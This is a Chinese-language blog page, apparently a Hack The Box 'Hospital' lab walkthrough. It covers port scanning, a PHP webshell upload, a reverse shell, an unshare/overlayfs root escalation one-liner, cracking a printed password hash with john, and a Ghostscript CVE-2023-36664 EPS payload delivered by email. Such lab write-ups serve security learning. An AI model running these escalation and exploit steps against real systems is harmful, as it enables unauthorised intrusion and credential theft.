@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Hackthebox - S3 - Hospital | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="ReconPort Scan通过 rustscan 扫描，得到以下开放端口 1234567891011121314151617181920212223242526272829Open 10.10.11.241:22Open 10.10.11.241:53Open 10.10.11.241:88Open 10.10.11.241:135Open 10.10.11.241:139Open 10.10.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox - S3 - Hospital">
+<meta property="og:url" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ReconPort Scan通过 rustscan 扫描，得到以下开放端口 1234567891011121314151617181920212223242526272829Open 10.10.11.241:22Open 10.10.11.241:53Open 10.10.11.241:88Open 10.10.11.241:135Open 10.10.11.241:139Open 10.10.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/f153dc16b8f6e2be1d77a4491b04e0fe.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/5fc8102245bd275b7aba2a716c85de70.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/7c6203f5743b214185d16756110aaf1e.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/b04d92fc7e8628302390819e4bf4cc08.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/767cc0fb766ab46f2b99ac3dca9fe2bb.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/674c227022995f59538303d7c323910f.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/2f0c5abb885b27000dd6bc8ec84ecb8c.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/2c8b390d78cbe28e9568759850c62f34.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/e6d9a8f26167c361d4c0e170f633cc4d.png">
+<meta property="og:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/c8e64c441fe7bb126cfb9f25a929a25e.png">
+<meta property="article:published_time" content="2023-11-23T06:43:14.000Z">
+<meta property="article:modified_time" content="2023-11-23T08:12:19.980Z">
+<meta property="article:author" content="yutian">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/assets/f153dc16b8f6e2be1d77a4491b04e0fe.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Hexo" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yutian</h5>
+          <a href="mailto:undefined" class="mail">
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yutianqaq" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-about"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Hackthebox - S3 - Hospital</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Hackthebox - S3 - Hospital</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-11-23T06:43:14.000Z" itemprop="datePublished" class="page-time">
+  2023-11-23
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Recon"><span class="post-toc-number">1.</span> <span class="post-toc-text">Recon</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Port-Scan"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Port Scan</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#443"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">443</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8080"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">8080</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#www-data"><span class="post-toc-number">2.</span> <span class="post-toc-text">www-data</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#提权"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">提权</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox-S3-Hospital"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Hackthebox - S3 - Hospital</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-11-23 14:43:14" datetime="2023-11-23T06:43:14.000Z"  itemprop="datePublished">2023-11-23</time>
+
+            
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><h2 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h2><p>通过 rustscan 扫描，得到以下开放端口</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.11.241:22</span><br><span class="line">Open 10.10.11.241:53</span><br><span class="line">Open 10.10.11.241:88</span><br><span class="line">Open 10.10.11.241:135</span><br><span class="line">Open 10.10.11.241:139</span><br><span class="line">Open 10.10.11.241:389</span><br><span class="line">Open 10.10.11.241:443</span><br><span class="line">Open 10.10.11.241:445</span><br><span class="line">Open 10.10.11.241:464</span><br><span class="line">Open 10.10.11.241:593</span><br><span class="line">Open 10.10.11.241:636</span><br><span class="line">Open 10.10.11.241:1801</span><br><span class="line">Open 10.10.11.241:2105</span><br><span class="line">Open 10.10.11.241:2103</span><br><span class="line">Open 10.10.11.241:2107</span><br><span class="line">Open 10.10.11.241:2179</span><br><span class="line">Open 10.10.11.241:3269</span><br><span class="line">Open 10.10.11.241:3268</span><br><span class="line">Open 10.10.11.241:3389</span><br><span class="line">Open 10.10.11.241:5985</span><br><span class="line">Open 10.10.11.241:6404</span><br><span class="line">Open 10.10.11.241:6409</span><br><span class="line">Open 10.10.11.241:6406</span><br><span class="line">Open 10.10.11.241:6407</span><br><span class="line">Open 10.10.11.241:6613</span><br><span class="line">Open 10.10.11.241:6622</span><br><span class="line">Open 10.10.11.241:6636</span><br><span class="line">Open 10.10.11.241:8080</span><br><span class="line">Open 10.10.11.241:9389</span><br></pre></td></tr></table></figure>
+
+<p>对于以上结果，445 端口得到有效内容，只能从 web 端口获取信息</p>
+<h2 id="443"><a href="#443" class="headerlink" title="443"></a>443</h2><p>一个邮箱登录页面，没有账号，无法获得更多信息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/f153dc16b8f6e2be1d77a4491b04e0fe.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>在 8080 端口得到一个注册页面，<a href="http://10.10.11.241:8080/register.php" target="_blank" rel="noopener">http://10.10.11.241:8080/register.php</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/5fc8102245bd275b7aba2a716c85de70.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>注册账号后的页面只有一个上传接口，网站是使用 php 写的，所以写一个木马来测试命令执行。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/7c6203f5743b214185d16756110aaf1e.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/b04d92fc7e8628302390819e4bf4cc08.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>上传后，这里是无法执行执行命令，因为禁用了一些危险函数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/767cc0fb766ab46f2b99ac3dca9fe2bb.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这里尝试用蚁剑的插件来绕过，但上传后发现可以直接执行，由于不是独享实例，可能别人做过了这个步骤。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/674c227022995f59538303d7c323910f.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="www-data"><a href="#www-data" class="headerlink" title="www-data"></a>www-data</h1><p>反弹一个 shell 来操作</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/2f0c5abb885b27000dd6bc8ec84ecb8c.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@webserver:/tmp/yt$ </span><br><span class="line">unshare -rm sh -c <span class="string">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*"</span></span><br><span class="line"></span><br><span class="line">www-data@webserver:/tmp/yt$ u/python3 -c <span class="string">'import os;os.setuid(0);os.system("bash")'</span></span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>得到 drwilliams 用户的哈希</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwilliams:<span class="variable">$6</span><span class="variable">$uWBSeTcoXXTBRkiL</span><span class="variable">$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>john 破解哈希</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/S3/Hospital]</span><br><span class="line">└─$ cat <span class="built_in">hash</span>                 </span><br><span class="line">drwilliams:<span class="variable">$6</span><span class="variable">$uWBSeTcoXXTBRkiL</span><span class="variable">$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/S3/Hospital]</span><br><span class="line">└─$ john -w=/home/kali/Desktop/rockyou.txt <span class="built_in">hash</span> </span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">qwe123!@<span class="comment">#        (drwilliams)</span></span><br></pre></td></tr></table></figure>
+
+<p>drwilliams:qwe123!@#</p>
+<p>使用此凭据可以用来登录邮件服务</p>
+<p><a href="https://10.129.160.69/?_task=mail&_mbox=INBOX" target="_blank" rel="noopener">https://10.129.160.69/?_task=mail&amp;_mbox=INBOX</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/2c8b390d78cbe28e9568759850c62f34.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection" target="_blank" rel="noopener">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</a></p>
+<p>使用<a href="https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58" target="_blank" rel="noopener">脚本</a>生成base64 编码的 payload</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py -g -p <span class="string">"payload"</span> -x eps</span><br></pre></td></tr></table></figure>
+
+<p>接着开启监听，回复邮件，将生成的 eps 文件上传到附件</p>
+<p>在通过 eps 得到 shell 后，查看当前目录下的 bat 文件得到密码，使用 rdp 连接后得到 Administrator 密码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/e6d9a8f26167c361d4c0e170f633cc4d.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="assets/c8e64c441fe7bb126cfb9f25a929a25e.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2023-11-23T08:12:19.980Z" itemprop="dateUpdated">2023-11-23 16:12:19</time>
+</span><br>
+
+
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2023/11/23/Hackthebox-S3-Hospital/" target="_blank" rel="external">https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://yutianqaq.github.io">
+            <img src="/img/avatar.jpg" alt="yutian">
+            yutian
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/&title=《Hackthebox - S3 - Hospital》 — Hexo&pic=https://yutianqaq.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/&title=《Hackthebox - S3 - Hospital》 — Hexo&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Hackthebox - S3 - Hospital》 — Hexo&url=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/&via=https://yutianqaq.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/09/06/CheatSheet/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">CheatSheet</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yutian &copy; 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/&title=《Hackthebox - S3 - Hospital》 — Hexo&pic=https://yutianqaq.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/&title=《Hackthebox - S3 - Hospital》 — Hexo&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Hackthebox - S3 - Hospital》 — Hexo&url=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/&via=https://yutianqaq.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
